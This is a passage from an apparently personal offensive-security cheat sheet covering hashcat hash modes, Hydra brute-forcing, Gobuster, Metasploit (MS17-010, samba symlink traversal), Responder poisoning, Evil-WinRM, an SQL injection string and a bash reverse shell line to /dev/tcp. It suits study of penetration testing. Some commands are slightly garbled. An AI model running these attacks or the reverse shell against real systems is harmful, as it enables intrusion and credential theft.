            | `400`   | phpass, MD5(Wordpress), MD5(phpBB3), MD5(Joomla)    |
            | `500`   | md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5     |
            | `900`   | MD4                                                 |
            | `1000`  | NTLM                                                |
            | `1100`  | Domain Cached Credentials (DCC), MS Cache           |
            | `1400`  | SHA256                                              |
            | `1410`  | sha256($pass.$salt)                                 |
            | `1420`  | sha256($salt.$pass)                                 |
            | `1430`  | sha256(unicode($pass).$salt)                        |
            | `1431`  | base64(sha256(unicode($pass)))                      |
            | `1440`  | sha256($salt.unicode($pass))                        |
            | `1450`  | HMAC-SHA256 (key = $pass)                           |
            | `1460`  | HMAC-SHA256 (key = $salt)                           |
            | `1600`  | md5apr1, MD5(APR), Apache MD5                       |
            | `1700`  | SHA512                                              |
            | `1710`  | sha512($pass.$salt)                                 |
            | `1720`  | sha512($salt.$pass)                                 |
            | `1730`  | sha512(unicode($pass).$salt)                        |
            | `1740`  | sha512($salt.unicode($pass))                        |
            | `1750`  | HMAC-SHA512 (key = $pass)                           |
            | `1760`  | HMAC-SHA512 (key = $salt)                           |
            | `1800`  | SHA-512(Unix)                                       |
            | `2400`  | Cisco-PIX MD5                                       |
            | `2410`  | Cisco-ASA MD5                                       |
            | `2500`  | WPA/WPA2                                            |
            | `2600`  | Double MD5                                          |
            | `3200`  | bcrypt, Blowfish(OpenBSD)                           |
            | `3300`  | MD5(Sun)                                            |
            | `3500`  | md5(md5(md5($pass)))                                |
            | `3610`  | md5(md5($salt).$pass)                               |
            | `3710`  | md5($salt.md5($pass))                               |
            | `3720`  | md5($pass.md5($salt))                               |
            | `3800`  | md5($salt.$pass.$salt)                              |
            | `3910`  | md5(md5($pass).md5($salt))                          |
            | `4010`  | md5($salt.md5($salt.$pass))                         |
            | `4110`  | md5($salt.md5($pass.$salt))                         |
            | `4210`  | md5($username.0.$pass)                              |
            | `4300`  | md5(strtoupper(md5($pass)))                         |
            | `4400`  | md5(sha1($pass))                                    |
            | `4500`  | Double SHA1                                         |
            | `4600`  | sha1(sha1(sha1($pass)))                             |
            | `4700`  | sha1(md5($pass))                                    |
            | `4800`  | MD5(Chap), iSCSI CHAP authentication                |
            | `4900`  | sha1($salt.$pass.$salt)                             |
            | `5000`  | SHA-3(Keccak)                                       |
            | `5100`  | Half MD5                                            |
            | `5200`  | Password Safe SHA-256                               |
            | `5300`  | IKE-PSK MD5                                         |
            | `5400`  | IKE-PSK SHA1                                        |
            | `5500`  | NetNTLMv1-VANILLA / NetNTLMv1-ESS                   |
            | `5600`  | NetNTLMv2                                           |
            | `5700`  | Cisco-IOS SHA256                                    |
            | `5800`  | Android PIN                                         |
            | `6300`  | AIX {smd5}                                          |
            | `6400`  | AIX {ssha256}                                       |
            | `6500`  | AIX {ssha512}                                       |
            | `6700`  | AIX {ssha1}                                         |
            | `6900`  | GOST, GOST R 34.11-94                               |
            | `7000`  | Fortigate (FortiOS)                                 |
            | `7100`  | OS X v10.8+                                         |
            | `7200`  | GRUB 2                                              |
            | `7300`  | IPMI2 RAKP HMAC-SHA1                                |
            | `7400`  | sha256crypt, SHA256(Unix)                           |
            | `7900`  | Drupal7                                             |
            | `8400`  | WBB3, Woltlab Burning Board 3                       |
            | `8900`  | scrypt                                              |
            | `9200`  | Cisco $8$                                           |
            | `9300`  | Cisco $9$                                           |
            | `9800`  | Radmin2                                             |
            | `10000` | Django (PBKDF2-SHA256)                              |
            | `10200` | Cram MD5                                            |
            | `10300` | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                 |
            | `11000` | PrestaShop                                          |
            | `11100` | PostgreSQL Challenge-Response Authentication (MD5)  |
            | `11200` | MySQL Challenge-Response Authentication (SHA1)      |
            | `11400` | SIP digest authentication (MD5)                     |
            | `99999` | Plaintext                                           |

        - Specific hash type

            | Value | Description                                   |
            | ----- | --------------------------------------------- |
            |`11`   | Joomla < 2.5.18                               |
            |`12`   | PostgreSQL                                    |
            |`21`   | osCommerce, xt:Commerce                       |
            |`23`   | Skype                                         |
            |`101`  | nsldap, SHA-1(Base64), Netscape LDAP SHA      |
            |`111`  | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA   |
            |`112`  | Oracle S: Type (Oracle 11+)                   |
            |`121`  | SMF > v1.1                                    |
            |`122`  | OS X v10.4, v10.5, v10.6                      |
            |`123`  | EPi                                           |
            |`124`  | Django (SHA-1)                                |
            |`131`  | MSSQL(2000)                                   |
            |`132`  | MSSQL(2005)                                   |
            |`133`  | PeopleSoft                                    |
            |`141`  | EPiServer 6.x < v4                            |
            |`1421` | hMailServer                                   |
            |`1441` | EPiServer 6.x > v4                            |
            |`1711` | SSHA-512(Base64), LDAP {SSHA512}              |
            |`1722` | OS X v10.7                                    |
            |`1731` | MSSQL(2012 & 2014)                            |
            |`2611` | vBulletin < v3.8.5                            |
            |`2612` | PHPS                                          |
            |`2711` | vBulletin > v3.8.5                            |
            |`2811` | IPB2+, MyBB1.2+                               |
            |`3711` | Mediawiki B type                              |
            |`3721` | WebEdition CMS                                |
            |`7600` | Redmine Project Management Web App            |

- Online Attack

    - Hydra:

        - About:

            - A network logon cracker which supports many different services
            - Hydra is a parallelized login cracker which supports numerous protocols to attack. New modules are easy to add, beside that, it is flexible and very fast.
            - supported Service protocols:

                - adam6500
                - afp
                - asterisk
                - cisco
                - cisco-enable
                - cvs
                - firebird
                - ftp
                - ftps
                - http[s]-{head|get|post}
                - http[s]-{get|post}-form
                - http-proxy
                - http-proxy-urlenum
                - icq
                - imap[s]
                - irc
                - ldap2[s]
                - ldap3[-{cram|digest}md5][s]
                - mssql
                - mysql(v4)
                - mysql5
                - ncp
                - nntp
                - oracle
                - oracle-listener
                - oracle-sid
                - pcanywhere
                - pcnfs
                - pop3[s]
                - postgres
                - rdp
                - radmin2
                - redis
                - rexec
                - rlogin
                - rpcap
                - rsh
                - rtsp
                - s7-300
                - sapr3
                - sip
                - smb
                - smtp[s]
                - smtp-enum
                - snmp
                - socks5
                - ssh
                - sshkey
                - svn
                - teamspeak
                - telnet[s]
                - vmauthd
                - vnc
                - xmpp

        - Syntax:
            
            ```bash
            $ hydra IP Service Options
            ```

        - Options:

            Essential:
            - `-l login`: LOGIN

                - `-L file`  load several logins from FILE

            - `-p password`: Password

                - `-P file` load several passwords from FILE

            - `-C` FILE: colon separated "user:password" format, instead of -L/-P options
                ```bash
                $ cat wordlist.txt
                    admin:123
                ```            
            - `-x min:max:charset`

                - generate passwords from min to max length. charset can contain 1
                - for numbers, `a` for lowcase and `A` for upcase characters.
                - Any other character is added is put to the list.
                    
                    ```
                    1:2:a1%.
                    ```

                    The generated passwords will be of length 1 to 2 and contain
                    lowcase letters, numbers and/or percent signs and dots.

            Other:
            - `-R`: restore a previously aborted session. Requires a hydra.restore file was written. Options are restored, but can be changed by setting them after -R on the command line
            - `-S`: connect via SSL
            - `-O`: use old SSL v2 and v3
            - `-s`: PORT: if the service is on a different default port, define it here
            - `-y` disable use of symbols in -x bruteforce, see above
            - `-e` nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass
            - `-u`: by default Hydra checks all passwords for one login and then tries the next login. This option loops around the passwords, so the first password is tried on all logins, then the next password.
            - `-f`: exit after the first found login/password pair (per host if -M)
            - `-F`: exit after the first found login/password pair for any host (for usage with -M)
            - `-M` FILE: server list for parallel attacks, one entry per line
                - `-o` FILE: write found login/password pairs to FILE instead of stdout
                - `-b` FORMAT: specify the format for the `-o` FILE: text(default), json, jsonv1
                - `-t` TASKS: run TASKS number of connects in parallel (default: 16)
                - `-m` OPTIONS: module specific options. See hydra -U <module> what options are available.
                - `-w` TIME: defines the max wait time in seconds for responses (default: 32)
                - `-W` TIME: defines a wait time between each connection a task performs. This usually only makes sense if a low task number is used, .e.g -t 1
                - `-c` TIME: the wait time in seconds per login attempt over all threads (-t 1 is recommended) This usually only makes sense if a low task number is used, .e.g -t 1
                - `-4` / `-6`: prefer IPv4 (default) or IPv6 addresses
                - `-v` / `-V`: verbose mode / show login+pass combination for each attempt

            - `-d` debug mode
                (Y) `-I` ignore an existing restore file (don't wait 10 seconds)
                (Z) `-h`, `--help` Show summary of options.

## Hidden Web Discovery

- Burp Suite 

- Gobuster

    - Gobuster is tool used to discover hidden Webpage, subdomain, directories etc on websites, and is written in golang.

        - Light-weight
        - Multi-Threaded 
        - Non-Recursive

    - Installation

            # install Goland First
            sudo apt install golang-go
            # install GoBuster
            go install github.com/OJ/gobuster/v3@latest
            # A repository of Wordlists that can be used for web-discovery
            sudo apt install seclists

    - Global Flags:

        - `--delay duration`:        Time each thread waits between requests (e.g. 1500ms)
        - `--no-color`:              Disable color output
        - `--no-error`:              Don't display errors
        - `-z`, `--no-progress`:     Don't display progress
        - `-p`, `--pattern string`:  File containing replacement patterns
        - `-q`, `--quiet`:           Don't print the banner and other noise
        - `-t`, `--threads int` :    Number of concurrent threads (default 10)
        - `-o`, `--output string`:   Output file to write results to (defaults to stdout)
        - `-v`, `--verbose`:         Verbose output (errors)
        - `-w`, `--wordlist string`: Path to the wordlist 

    - Dir Mode

        - Uses directory/file enumeration mode

        - Syntax:
                
                gobuster dir [flags]

        - Flags:
            
            - `-f`, `--add-slash`:                      Append / to each request
            - `-c`, `--cookies string`:                 Cookies to use for the requests
            - `-d`, `--discover-backup`:                Also search for backup files by appending multiple backup extensions
                - `--exclude-length ints`:              exclude the following content length (completely ignores the status). Supply multiple times to exclude multiple sizes.
            - `-e`, `--expanded`:                       Expanded mode, print full URLs
            - `-x`, `--extensions string`:              File extension(s) to search for
            - `-r`, `--follow-redirect`:                Follow redirects
            - `-H`, `--headers stringArray`:            Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
            - `-h`, `--help`:                           help for dir
                - `--hide-length`:                      Hide the length of the body in the output
            - `-m`, `--method string`:                  Use the following HTTP method (default "GET")
            - `-n`, `--no-status`:                      Don't print status codes
            - `-k`, `--no-tls-validation`:              Skip TLS certificate verification
            - `-P`, `--password string`:                Password for Basic Auth
            - `--proxy string`:                         Proxy to use for requests [http(s)://host:port]
            - `--random-agent`:                         Use a random User-Agent string
            - `--retry`:                                Should retry on request timeout
            - `--retry-attempts int`:                   Times to retry on request timeout (default 3)
            - `-s`, `--status-codes string`:            Positive status codes (will be overwritten with status-codes-blacklist if set)
            - `-b`, `--status-codes-blacklist string`:  Negative status codes (will override status-codes if set) (default "404")
            - `--timeout duration`:                     HTTP Timeout (default 10s)
            - `-u`, `--url string`:                     The target URL
            - `-a`, `--useragent string`:               Set the User-Agent string (default "gobuster/3.2.0")
            - `-U, --username string`:                  Username for Basic Auth

        - Seclist WorldLists:
            
            `/usr/share/wordlists/seclists/Discovery/Web-Content/`
            
            - Examples:

            ```bash
            $ gobuster dir -u https://buffered.io -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
            ```

    - DNS Mode

        - Uses DNS subdomain enumeration mode, can be used to discover dub-domains

        - Syntax:
            
            ```
            $ gobuster dns [flags]
            ```

        - Flags:

            - `-d`, `--domain string`:      The target domain
            - `-h`, `--help`:               help for dns
            - `--no-fqdn`:            Do not automatically add a trailing dot to the domain, so the resolver uses the DNS search domain
            - `-r`, `--resolver string`:    Use custom DNS server (format server.com or server.com:port)
            - `-c`, `--show-cname`:         Show CNAME records (cannot be used with '-i' option)
            - `-i`, `--show-ips`:           Show IP addresses
            - `--timeout duration`:   DNS resolver timeout (default 1s)
            - `--wildcard`:           Force continued operation when wildcard found

        - Seclist Worldlists:
            
            `/usr/share/wordlists/seclists/Discovery/DNS/`
            
            - Examples:
            ```bash
            $ gobuster dns -d example.com -w
            ```

    - Virtual Host
            
        - Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)

        - Usage:
                
                $ gobuster vhost [flags]

        - Flags:
            
            - `--append-domain`:                     Append main domain from URL to words from wordlist. Otherwise the fully qualified domains need to be specified in the wordlist.
            - `--client-cert-p12 string`:            a p12 file to use for options TLS client certificates
            - `--client-cert-p12-password string`:   the password to the p12 file
            - `--client-cert-pem string`:            public key in PEM format for optional TLS client certificates
            - `--client-cert-pem-key string`:        private key in PEM format for optional TLS client certificates (this key needs to have no password)
            - `-c`, `--cookies string`:                    Cookies to use for the requests
            - `--domain string`:                     the domain to append when using an IP address as URL. If left empty and you specify a domain based URL the hostname from the URL is extracted
            - `--exclude-length string`:             exclude the following content lengths (completely ignores the status). You can separate multiple lengths by comma and it also supports ranges like 203-206
            - `-r`, `--follow-redirect`:                   Follow redirects
            - `-H`, `--headers stringArray`:               Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
            - `-h`, `--help`:                              help for vhost
            - `-m`, `--method string`:                     Use the following HTTP method (default "GET")
            - `--no-canonicalize-headers`:           Do not canonicalize HTTP header names. If set header names are sent as is.
            - `-k`, `--no-tls-validation`:                 Skip TLS certificate verification
            - `-P`, `--password string`:                   Password for Basic Auth
            - `--proxy string`:                      Proxy to use for requests [http(s)://host:port] or [socks5://host:port]
            - `--random-agent`:                      Use a random User-Agent string
            - `--retry`:                             Should retry on request timeout
            - `--retry-attempts int`:                Times to retry on request timeout (default 3)
            - `--timeout duration`:                  HTTP Timeout (default 10s)
            - `-u`, `--url string`:                        The target URL
            - `-a`, `--useragent string`:                  Set the User-Agent string (default "gobuster/3.6")
            - `-U`, `--username string`:                   Username for Basic Auth

        - Needs Custom/Specific worldlists
            
            ```bash
            $ gobuster vhost -u example.com -w ~/custom-wordlist.txt12. WorldLists
            ```

- `rockyou.txt` /usr/share/wordlists/rockyou.txt 14 million
- Seclists
 
    ```bash
    sudo apt install seclists
    ```
    - `/usr/share/wordlists/seclists/`
    - `/usr/share/wordlists/seclists/Usernames/`
    - `/usr/share/wordlists/seclists/Passwords/`
    - `/usr/share/wordlists/seclists/Discovery/`

Other:

## Metasploit Framework

- Metasploit is a Framework with containing Many Exploits for certain things, used for Attacking and checking if the machine is vunerable to the exploits and attacks

- Start

    ``` bash
    $ sudo msfconsole
    ```

- Commands:

    - `search <protocol>` search for exploits
        ``` bash
        msf6> search smb
        ```

    - `grep <text> seach <protocol>` Filter through the search results by only showing matching lines

        ``` bash
        # Search for Exploits
        msf6> grep exploit seach smb
        ```

    - `use <exploit>` use the specified exploit

        ```bash
        msf6> use auxiliary/scanner/smb/smb_ms17_010
        msf6> use exploit/windows/smb/ms17_010_psexec
        ```

- Exploit Commands
        
    - `show options` show all the options (they are key-value pair)

        ```bash    
        msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
        msf6 exploit(windows/smb/ms17_010_psexec) > show options
        ```

    - `set <option> <value>` changes an option to value,
            
            (press `TAB` to show all the possible values Doesn't work for some options like RHOSTS)

        ``` bash
        msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.150
        msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/reverse_http
        ```

    - `run` Check if it's vunerable

    - `exploit` Uses The Exploit

    - Some Common Options:

        - `RHOSTS` The Target machine
        - `RPORT` The Target Port
        - `payload` The Target Port

- use Cases

    - SMB Root Access

        ``` bash
        $ sudo msfconsole
        msf6> use auxiliary/admin/smb/samba_symlink_traversal
        msf6 auxiliary(admin/smb/samba_symlink_traversal) > set RHOSTS 192.168.1.159
        msf6 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
        msf6 auxiliary(admin/smb/samba_symlink_traversal) > exploit
        msf6 auxiliary(admin/smb/samba_symlink_traversal) > exit
        $ smbclient //192.168.1.159/tmp
        ```

## Name Service Poisoning

- `Responder`
A Tools Used for LLMNR, NBT-NS, MDNS, DNS Poisoning

- Flags:
        
    - `-I interface`, `--interface=<nterface`: Network interface to use, you can use 'ALL' as a wildcard for all interfaces
    - `-A`, `--analyze`: Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding.
    - `-i IPv4`, `--ip=IPv4`: Local IP to use (only for OSX)
    - `-6 IPv6`, `--externalip6=IPv6`: Poison all requests with another IPv6 address than Responder's one.
    - `-e 10.0.0.22`, `--externalip=10.0.0.22`: Poison all requests with another IP address than Responder's one.
        
    - `-b`, `--basic`: Return a Basic HTTP authentication. Default: NTLM
    - `-d`, `--DHCP`: Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False
    - `-D`, `--DHCP-DNS`: This option will inject a DNS server in the DHCP response, otherwise a WPAD server will be added. Default: False
    - `-w`, `--wpad`: Start the WPAD rogue proxy server. Default value is False
    - `-u` `UPSTREAM_PROXY`, `--upstream-proxy=UPSTREAM_PROXY`: Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)
    - `-F`, `--ForceWpadAuth`: Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False
    - `-P`, `--ProxyAuth`: Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective. Default: False
    - `-Q`, `--quiet`: Tell Responder to be quiet, disables a bunch of printing from the poisoners. Default: False
    - `--lm`: Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False
    - `--disable-ess`: Force ESS downgrade. Default: False
    - `-v`, `--verbose`: Increase verbosity.
    - `--version`: version
    - `-h`, `--help`: help

Example:

```bash
$ sudo responder -I eth0
```
    
## Windows

- Evil WinRM
        
    WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.

    Install

    ```bash
    # gem is the Package Manager for Programming Language Ruby
    $ gem install evil-winrm
    ```

    Syntax:

        ``` bash
        $ evil-winrm -i IP -u User Options?
        ```

    Flags:

    Required:

    - `-i`, `--ip IP`                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    - `-u`, `--user USER`                  Username (required if not using kerberos)

    Optional:

    - `-S`, `--ssl`:                        Enable ssl
    - `-c`, `--pub-key PUBLIC_KEY_PATH`:    Local path to public key certificate
    - `-r`, `--realm DOMAIN`:               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    - `-s`, `--scripts PS_SCRIPTS_PATH`:    Powershell scripts local path
    - `--spn SPN_PREFIX`:                   SPN prefix for Kerberos auth (default HTTP)
    - `-k`, `--priv-key PRIVATE_KEY_PATH`:  Local path to private key certificate
    - `-e`, `--executables EXES_PATH`:      C# executables local path
    - `-U`, `--url URL`:                    Remote url endpoint (default /wsman)
    - `-p`, `--password PASS`:              Password
    - `-H`, `--hash HASH`:                  NTHash
    - `-P`, `--port PORT`:                  Remote host port (default 5985)
    - `-V`, `--version`:                    Show version
    - `-n`, `--no-colors`:                  Disable colors
    - `-N`, `--no-rpath-completion`:        Disable remote path completion
    - `-l`, `--log`:                        Log the WinRM session
    - `-h`, `--help`:                       Help

Vunerabilites:

## Telnet

- In Linux-based distributions Telnet could be bypassed by just entering username "root", if not properly Configured

        user@kali~$ telnet 192.168.12.36

        username> root

        root@machine~#

## FTP

- username "anonymous" let's you login without having an account

    $ ftp
    username: anonymous
    password: 123

## MariSQL

- username `root` allows us to log into this MariaDB instance without providing a password. 

    $ mysql -u root -h <IP>

## SQL Injection

SQL injection can be done if a Website Uses SQL and doesn't properly Sanitize Their User Input such websites are Vunerable to SQL Injections and SQL Injections are done with with simple SQL Query. This doesn't work with Websites that were built properly

SQL injection String (Any Website that uses SQL and doesn't sanitize user input is vunerable to this):
    
```    
admin' OR '1'='1' -- 
```

## LLMNR Poisoning/NBT-NS

- Local-Link Multicast Name Resolution (LLMNR) is a Protocol Based on The Domain Name System (DNS) that allowed both IPv4 and IPv6 to perform name Resolution on the same local link it's used in Windows Vista, Windows 7 / Server 2008, Windows 10. it is also implemented by systemd-resolved on linux, however it is not accepted as a Standard by Internet Engineering Task Force (IETF)

- How LLMNS works is that it The "Target Machine" asks everyone on the same network if They know Where that Address is, If a Machine knows where that address is then It responds back to the Target Machine, This is where the "Hacker" come in, they tell the Target Machine that he knows wherer that Address is but asks for The "Hash" File on The Target Machine and it Responds back with the Hash File. This way of Getting Unauthorized Information is known as LLMNS Poisioning

- NetBIOS, NBT-NS identifies systems on a local network by their NetBIOS name.

## MultiCast DNS

## Cross-Site Request Forgery (CSRF)

## Cross-Site Scripting (XSS)

## Bash Reverse Shell

- in-some version of bash, it's possible to sent a reverse shell to the machine

        bash -y >& /dev/tcp/10.0.0.1/8080 0>&1
